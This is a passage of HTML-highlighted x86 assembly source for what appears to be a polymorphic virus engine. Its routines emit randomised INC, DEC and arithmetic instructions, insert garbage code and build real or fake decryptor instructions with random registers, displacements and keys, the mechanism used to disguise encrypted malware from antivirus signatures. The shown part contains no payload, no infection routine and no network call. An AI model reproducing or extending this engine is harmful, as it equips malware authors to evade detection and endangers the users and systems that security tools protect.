                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate INC reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_inc_reg32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_inc_reg16</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">g_inc_reg32</span><span class="sc0">

</span><span class="sc5">g_inc_reg8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_inc_reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_inc_reg8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate DEC reg</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_dec_reg32</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_dec_reg16</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">g_dec_reg32</span><span class="sc0">

</span><span class="sc5">g_dec_reg8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_dec_reg8</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">a_dec_reg8</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate ADD/SUB/XOR/OR/AND reg,imm</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">g_mathregimm32</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8166h</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">g_mathregimm8</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_NO_8BIT</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_math8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_math_work</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">00000002h</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">a_math8</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_math_work</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_math_imm</span><span class="sc4">-</span><span class="sc5">tbl_math_imm</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">tbl_math_imm</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate decryption instructions (real or fake ones)</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check if we are going to use a displacement in the</span><span class="sc0">
                </span><span class="sc1">;indexing mode</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">fake_or_not</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">more_complex</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Choose generator for [reg] indexing mode</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_idx_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">you_got_it</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;More fun?!?!</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">more_complex</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_build_flags</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">crypt_xtended</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Choose generator for [reg+imm] indexing mode</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_dis_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Use magic to convert some values into</span><span class="sc0">
                </span><span class="sc1">;desired instructions</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">you_got_it</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">adn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">adn_reg_02</span><span class="sc0">
</span><span class="sc5">adn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">                
</span><span class="sc5">adn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">common_part</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Choose [reg+reg] or [reg+reg+disp]</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">crypt_xtended</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Clear disp-over-disp</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ok_complex</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Get random displacement from current displacement</span><span class="sc0">
                </span><span class="sc1">;eeehh?!?</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Choose generator for [reg+reg+imm] indexing mode</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_paranoia</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_xtended</span><span class="sc0">

</span><span class="sc5">ok_complex</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">load_aux</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Choose generator for [reg+reg] indexing mode</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_xtended</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Build decryptor instructions</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">done_xtended</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">size_correct</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_01</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">arn_reg_02</span><span class="sc0">
</span><span class="sc5">arn_reg_01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc5">arn_reg_02</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">00000101b</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">arn_reg_03</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Restore aux reg state</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">arn_reg_03</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Get post-build flags</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">common_part</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">;Insert displacement from real address?</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTDISP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_disp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">disp2disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Insert key?</span><span class="sc0">
        </span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">skip_disp</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">MAGIC_PUTKEY</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip_key</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_key</span><span class="sc0">

</span><span class="sc5">skip_key</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Choose a magic generator</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">choose_magic</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000006h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Do operand size correction</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">size_correct</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fake_oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">store_correct</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc0">
